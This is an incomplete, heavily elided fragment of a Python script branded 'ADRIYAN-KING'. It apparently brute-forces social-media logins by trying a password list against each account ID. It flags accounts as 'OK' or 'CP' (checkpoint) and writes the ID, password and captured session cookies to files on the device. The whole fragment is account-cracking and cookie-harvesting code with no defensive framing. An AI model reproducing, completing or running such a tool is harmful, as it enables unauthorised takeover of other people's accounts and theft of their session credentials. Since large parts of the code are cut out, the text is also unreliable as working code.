...
def banner():
	...
	ban=''' ADRIYAN-KING
       ...
       d8888 8888888b.  8888888b.  8888888 Y88b   d88P     d8888 888b    888      
      d88888 888  "Y88b 888   Y88b   888    Y88b d88P     d88888 8888b   888      
     d88P888 888    888 888    888   888     Y88o88P     d88P888 88888b  888      
    d88P 888 888    888 888   d88P   888      Y888P     d88P 888 888Y88b 888      
   d88P  888 888    888 8888888P"    888       888     d88P  888 888 Y88b888      
  d88P   888 888    888 888 T88b     888       888    d88P   888 888  Y88888      
 d8888888888 888  .d88P 888  T88b    888       888   d8888888888 888   Y8888      
d88P     888 8888888P"  888   T88b 8888888     888  d88P     888 888    Y888      
                                                                                                                                                                         '''
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ✨ ADRIYAN-LOL-CP ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ ADRIYAN-KING-OK ❤️✨[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/ADRIYAN-KING/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ADRIYAN-KING/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='-ADRIYAN-KING  OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ADRIYAN-KING  OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ADRIYAN-KING  CP'))
					open('/sdcard/ADRIYAN-KINGG/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
